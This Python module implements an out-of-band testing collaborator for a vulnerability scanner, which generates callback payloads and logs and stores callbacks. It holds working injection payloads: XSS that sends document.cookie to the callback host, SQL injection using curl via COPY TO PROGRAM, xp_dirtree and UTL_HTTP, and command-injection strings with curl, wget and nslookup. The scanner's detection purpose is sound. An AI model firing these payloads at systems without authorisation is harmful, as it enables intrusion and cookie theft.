import time
import uuid
import asyncio
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import aiohttp
from database import mongodb  # for direct low-level fallback
from mongo_service import mongo_service
"""
OAST (Out-of-Band Application Security Testing) Collaborator Service
Handles callback generation, monitoring, and management for blind vulnerability detection
"""

 # imports moved above (deduplicated)


@dataclass
class OASTCallback:
    """Represents an OAST callback interaction"""
    id: str
    payload_id: str
    timestamp: datetime
    source_ip: str
    method: str
    headers: Dict[str, str]
    body: str
    url: str
    vulnerability_type: str
    scan_id: Optional[str] = None


@dataclass
class OASTPayload:
    """Represents an OAST payload for testing"""
    id: str
    payload: str
    callback_url: str
    vulnerability_type: str
    created_at: datetime
    expires_at: datetime
    scan_id: Optional[str] = None


class OASTCollaborator:
    """OAST Collaborator for detecting blind vulnerabilities via out-of-band channels"""
    
    def __init__(self, collaborator_url: Optional[str] = None, auth_token: Optional[str] = None):
        """
        Initialize OAST Collaborator
        
        Args:
            collaborator_url: Base URL for the collaborator server (e.g., Burp Collaborator)
            auth_token: Authentication token if required
        """
        # Allow environment variable override (env has precedence only if explicit arg not provided)
        env_url = os.getenv("OAST_COLLABORATOR_URL")
        base_url = collaborator_url or env_url or "http://jgttkljvdxkvayqdrteglrkmaytpohopd.oast.fun"
        # Normalize and store
        self.collaborator_url = base_url.rstrip('/')
        self.auth_token = auth_token or os.getenv("OAST_COLLABORATOR_TOKEN")
        # Storage for generated payloads and received callbacks (in-memory; persisted separately)
        self.payloads = {}
        self.callbacks = {}
        self.session = None
            
    async def initialize(self):
        """Initialize the collaborator service"""
        self.session = aiohttp.ClientSession()
        
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
            
    def generate_callback_id(self) -> str:
        """Generate a unique callback identifier"""
        return str(uuid.uuid4()).replace('-', '')[:16]
        
    def generate_subdomain(self) -> str:
        """Generate a unique (sub)domain for OAST testing.

        If the base collaborator domain already looks like a pre-generated
        unique hostname (e.g. long random label + .oast.fun) we reuse it as-is
        so we don't prepend another random prefix which could break DNS.
        Otherwise we prepend a fresh random ID to spread callbacks per payload.
        """
        base = self.collaborator_url.replace('http://', '').replace('https://', '')
        first_label = base.split('.')[0]
        # Heuristic: if first label length > 25 assume already unique
        if len(first_label) > 25:
            return base
        return f"{self.generate_callback_id()}.{base}"
        
    def generate_xss_payloads(self, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Generate XSS OAST payloads for blind XSS detection"""
        payloads = []
        
        # JavaScript-based payloads
        js_templates = [
            '<script>fetch("http://{subdomain}/xss?data="+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://{subdomain}/xss?location=\'+location.href)">',
            '<svg onload="fetch(\'http://{subdomain}/xss?dom=\'+document.documentElement.outerHTML.length)">',
            '"><script>new Image().src="http://{subdomain}/xss?cookie="+btoa(document.cookie)</script>',
            '\';fetch("http://{subdomain}/xss?ref="+document.referrer);//'
        ]
        
        for template in js_templates:
            callback_id = self.generate_callback_id()
            subdomain = self.generate_subdomain()
            payload_text = template.format(subdomain=subdomain)
            callback_url = f"http://{subdomain}/xss"
            
            payload = OASTPayload(
                id=callback_id,
                payload=payload_text,
                callback_url=callback_url,
                vulnerability_type="xss",
                created_at=datetime.now(),
                expires_at=datetime.now() + timedelta(hours=1),
                scan_id=scan_id
            )
            
            self.payloads[callback_id] = payload
            payloads.append({
                "callback_id": callback_id,
                "payload": payload_text,
                "callback_url": callback_url
            })
            
        # Persist payloads (fire-and-forget)
        # Background persist (non-blocking); best-effort only
        try:
            if mongo_service._check_connection() and payloads:
                docs = [
                    {
                        "payload_id": p["callback_id"],
                        "payload": p["payload"],
                        "callback_url": p["callback_url"],
                        "type": "xss",
                        "scan_id": scan_id,
                        "created_at": datetime.utcnow(),
                        "expires_at": datetime.utcnow() + timedelta(hours=1)
                    } for p in payloads
                ]
                try:
                    if hasattr(mongodb, 'db') and mongodb.db is not None:
                        loop = asyncio.get_running_loop()
                        loop.create_task(mongodb.db.oast_payloads.insert_many(docs))
                except RuntimeError:  # no running loop (sync context)
                    pass
        except Exception:
            pass
        return payloads
        
    def generate_sqli_payloads(self, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Generate SQL injection OAST payloads for blind SQLi detection"""
        payloads = []
        
        # Database-specific OAST payloads
        db_templates = {
            "mysql": [
                "' UNION SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',VERSION()))-- ",
                "'; SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',USER()))-- ",
            ],
            "postgresql": [
                "'; COPY (SELECT version()) TO PROGRAM 'curl http://{subdomain}/sqli?postgres=1'-- ",
                "' UNION SELECT NULL,NULL,version() INTO OUTFILE '/dev/null' LINES TERMINATED BY '\ncurl http://{subdomain}/sqli?postgres=version'-- ",
            ],
            "mssql": [
                "'; EXEC master..xp_dirtree '\\\\{subdomain}\\sqli\\mssql'-- ",
                "' UNION SELECT NULL,NULL,@@version,NULL INTO OUTFILE '\\\\{subdomain}\\sqli\\mssql'-- ",
            ],
            "oracle": [
                "' UNION SELECT UTL_HTTP.request('http://{subdomain}/sqli?oracle='||USER) FROM dual-- ",
                "'; SELECT UTL_INADDR.get_host_name('{subdomain}') FROM dual-- ",
            ]
        }
        
        for db_type, templates in db_templates.items():
            for template in templates:
                callback_id = self.generate_callback_id()
                subdomain = self.generate_subdomain()
                payload_text = template.format(subdomain=subdomain)
                callback_url = f"http://{subdomain}/sqli"
                
                payload = OASTPayload(
                    id=callback_id,
                    payload=payload_text,
                    callback_url=callback_url,
                    vulnerability_type="sqli",
                    created_at=datetime.now(),
                    expires_at=datetime.now() + timedelta(hours=1),
                    scan_id=scan_id
                )
                
                self.payloads[callback_id] = payload
                payloads.append({
                    "callback_id": callback_id,
                    "payload": payload_text,
                    "callback_url": callback_url,
                    "db_type": db_type
                })
                
        # Persist payloads
        try:
            if mongo_service._check_connection() and payloads:
                docs = [
                    {
                        "payload_id": p["callback_id"],
                        "payload": p["payload"],
                        "callback_url": p["callback_url"],
                        "type": "sqli",
                        "db_type": p.get("db_type"),
                        "scan_id": scan_id,
                        "created_at": datetime.utcnow(),
                        "expires_at": datetime.utcnow() + timedelta(hours=1)
                    } for p in payloads
                ]
                try:
                    if hasattr(mongodb, 'db') and mongodb.db is not None:
                        loop = asyncio.get_running_loop()
                        loop.create_task(mongodb.db.oast_payloads.insert_many(docs))
                except RuntimeError:
                    pass
        except Exception:
            pass
        return payloads
        
    def generate_command_injection_payloads(self, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Generate command injection OAST payloads"""
        payloads = []
        
        # OS-specific command injection payloads
        cmd_templates = [
            # Unix/Linux
            "; curl http://{subdomain}/cmd?os=unix",
            "| wget -qO- http://{subdomain}/cmd?os=linux",
            "`nslookup {subdomain}`",
            "$(dig {subdomain})",
            
            # Windows
            "& nslookup {subdomain}",
            "| ping -n 1 {subdomain}",
            "; powershell Invoke-WebRequest http://{subdomain}/cmd?os=windows",
        ]
        
        for template in cmd_templates:
            callback_id = self.generate_callback_id()
            subdomain = self.generate_subdomain()
            payload_text = template.format(subdomain=subdomain)
            callback_url = f"http://{subdomain}/cmd"
            
            payload = OASTPayload(
                id=callback_id,
                payload=payload_text,
                callback_url=callback_url,
                vulnerability_type="command_injection",
                created_at=datetime.now(),
                expires_at=datetime.now() + timedelta(hours=1),
                scan_id=scan_id
            )
            
            self.payloads[callback_id] = payload
            payloads.append({
                "callback_id": callback_id,
                "payload": payload_text,
                "callback_url": callback_url
            })
            
        return payloads
        
    async def register_callback(self, callback_data: Dict[str, Any]) -> bool:
        """Register a callback interaction"""
        try:
            callback = OASTCallback(
                id=str(uuid.uuid4()),
                payload_id=callback_data.get("payload_id", ""),
                timestamp=datetime.now(),
                source_ip=callback_data.get("source_ip", ""),
                method=callback_data.get("method", "GET"),
                headers=callback_data.get("headers", {}),
                body=callback_data.get("body", ""),
                url=callback_data.get("url", ""),
                vulnerability_type=callback_data.get("vulnerability_type", "unknown"),
                scan_id=callback_data.get("scan_id")
            )
            
            payload_id = callback.payload_id
            if payload_id not in self.callbacks:
                self.callbacks[payload_id] = []
            self.callbacks[payload_id].append(callback)
            # Persist callback
            try:
                if mongo_service._check_connection():
                    doc = {
                        "callback_id": callback.id,
                        "payload_id": callback.payload_id,
                        "source_ip": callback.source_ip,
                        "method": callback.method,
                        "headers": callback.headers,
                        "body": callback.body,
                        "url": callback.url,
                        "type": callback.vulnerability_type,
                        "scan_id": callback.scan_id,
                        "timestamp": callback.timestamp
                    }
                    if hasattr(mongodb, 'db') and mongodb.db is not None:
                        await mongodb.db.oast_callbacks.insert_one(doc)
            except Exception:
                pass
            
            return True
        except Exception as e:
            print(f"Error registering callback: {e}")
            return False
            
    def check_callback(self, payload_id: str) -> bool:
        """Check if a callback has been received for a specific payload"""
        return payload_id in self.callbacks and len(self.callbacks[payload_id]) > 0
        
    def get_callbacks(self, payload_id: Optional[str] = None, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Get callbacks for a specific payload or scan"""
        result = []
        
        for pid, callbacks in self.callbacks.items():
            for callback in callbacks:
                if payload_id and pid != payload_id:
                    continue
                if scan_id and callback.scan_id != scan_id:
                    continue
                    
                result.append({
                    "id": callback.id,
                    "payload_id": callback.payload_id,
                    "timestamp": callback.timestamp.isoformat(),
                    "source_ip": callback.source_ip,
                    "method": callback.method,
                    "headers": callback.headers,
                    "body": callback.body,
                    "url": callback.url,
                    "vulnerability_type": callback.vulnerability_type,
                    "scan_id": callback.scan_id
                })
                
        return result
        
    def get_payloads(self, scan_id: Optional[str] = None, vulnerability_type: Optional[str] = None) -> List[Dict[str, Any]]:
        """Get generated payloads"""
        result = []
        
        for payload in self.payloads.values():
            if scan_id and payload.scan_id != scan_id:
                continue
            if vulnerability_type and payload.vulnerability_type != vulnerability_type:
                continue
                
            result.append({
                "id": payload.id,
                "payload": payload.payload,
                "callback_url": payload.callback_url,
                "vulnerability_type": payload.vulnerability_type,
                "created_at": payload.created_at.isoformat(),
                "expires_at": payload.expires_at.isoformat(),
                "scan_id": payload.scan_id,
                "has_callback": self.check_callback(payload.id)
            })
            
        return result
        
    def cleanup_expired_payloads(self):
        """Remove expired payloads and their callbacks"""
        now = datetime.now()
        expired_ids = [
            pid for pid, payload in self.payloads.items() 
            if payload.expires_at < now
        ]
        
        for pid in expired_ids:
            del self.payloads[pid]
            if pid in self.callbacks:
                del self.callbacks[pid]
                
        return len(expired_ids)
        
    def get_statistics(self) -> Dict[str, Any]:
        """Get OAST statistics"""
        total_payloads = len(self.payloads)
        total_callbacks = sum(len(callbacks) for callbacks in self.callbacks.values())
        active_payloads = sum(1 for p in self.payloads.values() if p.expires_at > datetime.now())
        
        vuln_types = {}
        for payload in self.payloads.values():
            vtype = payload.vulnerability_type
            if vtype not in vuln_types:
                vuln_types[vtype] = {"payloads": 0, "callbacks": 0}
            vuln_types[vtype]["payloads"] += 1
            vuln_types[vtype]["callbacks"] += len(self.callbacks.get(payload.id, []))
            
        return {
            "total_payloads": total_payloads,
            "active_payloads": active_payloads,
            "total_callbacks": total_callbacks,
            "vulnerability_types": vuln_types,
            "vulnerability_percentage": round((total_callbacks / total_payloads * 100) if total_payloads > 0 else 0, 2)
        }


# Global OAST collaborator instance
oast_collaborator = OASTCollaborator()
